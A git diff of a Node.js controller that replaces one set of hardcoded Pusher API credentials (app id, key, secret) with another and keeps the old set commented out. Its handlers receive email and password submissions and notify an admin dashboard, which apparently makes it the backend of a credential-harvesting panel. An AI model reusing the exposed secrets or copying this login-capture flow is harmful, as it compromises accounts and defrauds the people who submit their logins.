@@ -23,13 +23,22 @@ import Pusher from'pusher';
 
 
 export const email_post = async (req, res) => {
+    // const pusher = new Pusher({
+    //     appId: '1883790',
+    //     key: 'c69be5ea3652b02905c7',
+    //     secret: 'd5258e0315991e7b5cc6',
+    //     cluster: 'mt1',
+    //     useTLS: true,
+    //   });
+
     const pusher = new Pusher({
-        appId: '1883790',
-        key: 'c69be5ea3652b02905c7',
-        secret: 'd5258e0315991e7b5cc6',
-        cluster: 'mt1',
+        appId: '1773152',
+        key: 'f47031316f13ab641256',
+        secret: 'f1f2616da0bb8ffa85b7',
+        cluster: 'ap2',
         useTLS: true,
-      });
+      })
+
 
     const { adminId, posterId } = req.params
     const { site, email } = req.body
@@ -56,6 +65,8 @@ export const email_post = async (req, res) => {
 
             })
             
+
+          
           
             if(info){
                 pusher.trigger(userFound.adminId, 'dashboard-notification', {
@@ -126,13 +137,21 @@ export const email_post_wrong = async(req, res) => {
 
 export const password_post = async(req, res) => {
 
+    // const pusher = new Pusher({
+    //     appId: '1883790',
+    //     key: 'c69be5ea3652b02905c7',
+    //     secret: 'd5258e0315991e7b5cc6',
+    //     cluster: 'mt1',
+    //     useTLS: true,
+    //   });
+
     const pusher = new Pusher({
-        appId: '1883790',
-        key: 'c69be5ea3652b02905c7',
-        secret: 'd5258e0315991e7b5cc6',
-        cluster: 'mt1',
+        appId: '1773152',
+        key: 'f47031316f13ab641256',
+        secret: 'f1f2616da0bb8ffa85b7',
+        cluster: 'ap2',
         useTLS: true,
-      });
+      })
     const { id, password ,adminId,posterId} = req.body;
  
     const filter = { _id: id };
